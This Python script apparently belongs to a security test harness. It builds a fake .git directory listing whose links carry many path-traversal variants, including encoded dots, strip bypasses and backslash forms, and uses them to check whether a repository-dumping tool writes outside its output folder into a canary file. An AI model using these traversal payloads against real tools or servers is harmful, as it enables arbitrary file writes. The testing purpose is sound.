"""Generate a payload that lures a recursive pillager into writing
outside its output directory via path-traversal anchors in a fake
HTML directory listing (justinsteven 2022, second PoC).

Layout served by evil_server:

    payload/
      .git/
        HEAD                # so the pillager treats this as a repo
        config              # innocent
        index.html          # the lure: many traversal-href variants
      canary/
        PWNED_C1            # what gets written to /canary/PWNED_C1
                            # if any of the traversal hrefs lands

The href set is comprehensive within the "literal-dot-dot, write into
/canary" family, covering depth variants, the `....//` replace-bypass
class, layered relative paths, URL-encoded separators, percent-encoded
dots, backslash separators, and path-parameter (`..;/`) tricks.  All
target the same `/canary/PWNED_C1` so a single canary check is enough
— if any variant escapes, that file appears.

Absolute-path payloads (`/etc/passwd`, `%2e%2e%2fetc%2fpasswd`) are
intentionally out of scope here: they would write inside the
container's root rather than into the side-mounted canary directory,
and need a separate scenario with sentinel files at the absolute
targets to be detectable.
"""

from __future__ import annotations

import shutil
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAYLOAD = HERE / "payload"

# Every href below targets /canary/PWNED_C1.  Any success creates the
# canary file and the default oracle flags FAIL.
HREFS = [
    # 1. Depth variants — historic justinsteven payloads.
    "../../canary/PWNED_C1",
    "../../../canary/PWNED_C1",
    "../../../../canary/PWNED_C1",
    "../../../../../canary/PWNED_C1",

    # 2. replace("..","") bypass family — survives a greedy
    #    non-overlapping ".." strip and still resolves to traversal.
    "....//canary/PWNED_C1",
    "....//.....//canary/PWNED_C1",
    "......//canary/PWNED_C1",
    ".....///canary/PWNED_C1",

    # 3. Layered: traversal mixed with a leading non-traversal segment.
    "x/../../canary/PWNED_C1",
    "foo/../../../canary/PWNED_C1",
    "./../canary/PWNED_C1",
    "a/b/../../../canary/PWNED_C1",

    # 4. Double-slash variants — some normalisers collapse, some don't.
    "..//..//canary/PWNED_C1",
    "..///..///canary/PWNED_C1",

    # 5. Backslash separator — mostly Windows-relevant but exercises
    #    parsers that try to handle either separator.
    "..\\..\\canary\\PWNED_C1",

    # 6. URL-encoded separators.
    "..%2fcanary%2fPWNED_C1",
    "..%2f..%2fcanary%2fPWNED_C1",
    "..%5c..%5ccanary%5cPWNED_C1",

    # 7. URL-encoded dots.
    "%2e%2e/canary/PWNED_C1",
    "%2e%2e%2fcanary%2fPWNED_C1",
    "%2e%2e/%2e%2e/canary/PWNED_C1",

    # 8. Path-parameter trick — strips after `;` in some routers.
    "..;/canary/PWNED_C1",
    "..;foo=bar/canary/PWNED_C1",
]

INDEX_HTML = (
    "<!DOCTYPE html>\n"
    "<html>\n"
    "<head><title>Index of /.git/</title></head>\n"
    "<body><h1>Index of /.git/</h1><hr><pre>\n"
    '<a href="HEAD">HEAD</a>\n'
    '<a href="config">config</a>\n'
    + "\n".join(f'<a href="{h}">PWNED_C1</a>' for h in HREFS)
    + "\n</pre><hr></body></html>\n"
)

CONFIG = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
"""


def main() -> None:
    if PAYLOAD.exists():
        shutil.rmtree(PAYLOAD)
    git_dir = PAYLOAD / ".git"
    git_dir.mkdir(parents=True)
    (git_dir / "HEAD").write_text("ref: refs/heads/main\n")
    (git_dir / "config").write_text(CONFIG)
    (git_dir / "index.html").write_text(INDEX_HTML)

    canary_dir = PAYLOAD / "canary"
    canary_dir.mkdir()
    (canary_dir / "PWNED_C1").write_text("PWNED via HTML traversal anchor\n")

    print(f"Built C1 payload at {PAYLOAD} ({len(HREFS)} href variants)")


if __name__ == "__main__":
    main()
